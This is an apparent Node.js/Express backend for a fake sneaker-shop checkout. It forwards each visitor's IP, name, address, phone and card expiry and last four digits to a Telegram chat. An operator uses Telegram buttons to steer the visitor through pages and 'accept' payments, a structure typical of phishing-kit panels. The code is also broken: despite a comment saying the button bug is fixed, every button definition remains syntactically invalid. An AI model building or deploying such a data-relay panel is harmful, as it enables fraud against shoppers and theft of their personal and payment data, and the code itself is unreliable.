require('dotenv').config();
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(bodyParser.json());
app.use(express.static('public'));

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const sessions = new Map();

// Nettoyage toutes les 30 min
setInterval(() => {
  const now = Date.now();
  for (const [id, data] of sessions.entries()) {
    if (now - data.timestamp > 1800000) sessions.delete(id);
  }
}, 900000);

// Génère le texte de la notification
function buildMessageText(data) {
  let text = `🆕 Nouvel utilisateur\n`;
  text += `🆔 ${data.visitorId}\n`;
  text += `🌐 ${data.ip}\n\n`;

  if (data.product) text += `👟 ${data.product}\n\n`;
  if (data.delivery) {
    const d = data.delivery;
    text += `🏠 ${d.address}\n`;
    text += `👤 ${d.firstname} ${d.lastname}\n`;
    text += `📞 ${d.phone}\n\n`;
  }
  if (data.payment) {
    const p = data.payment;
    text += `💳 **** **** **** ${p.last4}\n`;
    text += `📅 ${p.expiry}\n\n`;
  }
  return text;
}

// ✅ CORRIGÉ : utilisation de `callback_data` (pas `callback_`)
function buildButtons(data) {
  if (data.payment && !data.validated) {
    return [[{ text: "✅ Accepter paiement", callback_ `accept_${data.visitorId}` }]];
  }
  return [
    [{ text: "🏠 Accueil", callback_ `goto_home_${data.visitorId}` }],
    [{ text: "👟 Baskets", callback_ `goto_baskets_${data.visitorId}` }],
    [{ text: "📦 Livraison", callback_ `goto_delivery_${data.visitorId}` }],
    [{ text: "💳 Paiement", callback_ `goto_payment_${data.visitorId}` }],
    [{ text: "✅ Valider", callback_ `goto_success_${data.visitorId}` }]
  ];
}

// Met à jour ou crée la notification Telegram
async function updateOrCreateNotification(data) {
  const text = buildMessageText(data);
  const reply_markup = { inline_keyboard: buildButtons(data) };

  try {
    if (data.message_id) {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        chat_id: CHAT_ID,
        message_id: data.message_id,
        text,
        reply_markup,
        disable_web_page_preview: true
      });
    } else {
      const res = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text,
        reply_markup,
        disable_web_page_preview: true
      });
      data.message_id = res.data.result.message_id;
    }
  } catch (err) {
    console.error("❌ Telegram error:", err.message);
  }
}

// Réception des événements frontend
app.post('/event', async (req, res) => {
  const { type, visitorId, ip, eventData } = req.body;
  if (!visitorId || !ip) return res.status(400).json({ error: 'ID and IP required' });

  let session = sessions.get(visitorId);
  if (!session) {
    session = { visitorId, ip, timestamp: Date.now() };
    sessions.set(visitorId, session);
  }
  session.timestamp = Date.now();

  if (type === 'product_selected') {
    session.product = eventData.product;
  } else if (type === 'delivery_submitted') {
    session.delivery = eventData;
  } else if (type === 'payment_submitted') {
    session.payment = {
      last4: eventData.cardNumber.slice(-4),
      expiry: eventData.expiry
    };
  }

  sessions.set(visitorId, session);
  await updateOrCreateNotification(session);
  res.json({ ok: true });
});

// Webhook Telegram (boutons)
app.post('/webhook', (req, res) => {
  const update = req.body;
  res.sendStatus(200);

  if (update.callback_query) {
    const { data, message } = update.callback_query;
    const chatId = message.chat.id;
    const messageId = message.message_id;

    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      callback_query_id: update.callback_query.id
    });

    const match = data.match(/^(goto_home|goto_baskets|goto_delivery|goto_payment|goto_success|accept)_(.+)$/);
    if (!match) return;

    const action = match[1];
    const visitorId = match[2];
    const session = sessions.get(visitorId);
    if (!session) return;

    let target = "/";
    if (action === 'goto_baskets') target = "/baskets.html";
    else if (action === 'goto_delivery') target = "/delivery.html";
    else if (action === 'goto_payment') target = "/payment.html";
    else if (action === 'goto_success' || action === 'accept') {
      target = "/success.html";
      session.validated = true;
      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: CHAT_ID,
        text: `✅ COMMANDE VALIDÉE !\n\n${buildMessageText(session)}`
      });
    }

    session.target = target;
    sessions.set(visitorId, session);

    if (action !== 'accept') {
      axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        chat_id: chatId,
        message_id: messageId,
        text: `➡️ Redirection vers ${target}\n🆔 ${visitorId}`,
        reply_markup: { inline_keyboard: [] }
      });
    }
  }
});

// Frontend : vérifie la cible de redirection
app.get('/target/:visitorId', (req, res) => {
  const session = sessions.get(req.params.visitorId);
  res.json({ target: session?.target || null });
});

// Définir le webhook Telegram
app.get('/set-webhook', async (req, res) => {
  const url = `${process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`}/webhook`;
  try {
    const r = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(url)}`);
    res.json(r.data);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Écoute sur toutes les interfaces (obligatoire pour Render)
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Serveur démarré sur le port ${PORT}`);
});
